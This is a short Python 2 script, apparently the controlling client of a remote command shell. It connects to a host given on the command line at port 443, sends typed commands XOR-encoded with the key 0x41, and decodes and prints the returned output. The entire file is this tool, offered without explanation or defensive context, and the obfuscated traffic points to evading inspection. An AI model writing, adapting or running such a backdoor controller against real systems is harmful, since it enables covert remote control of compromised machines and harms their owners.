#!/usr/bin/python
import socket
import sys
import time
print (len(sys.argv))
HOST = sys.argv[1]
# HOST = '127.0.0.1'
PORT = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
 
while True:
    try:
        command = raw_input('~$ ')
        if command == "":
            continue
        elif command == "exit" or command == "quit":
            break
        encode = bytearray(command)
        for i in range(len(encode)):
            encode[i] ^= 0x41
        s.send(encode)
        count = int(s.recv(10))
        if count > 0: 
            en_data = s.recv(count)
            decode = bytearray(en_data)
            for i in range(len(decode)):
                decode[i] ^= 0x41
            print (decode)
    except:
        print ("")
 
s.close()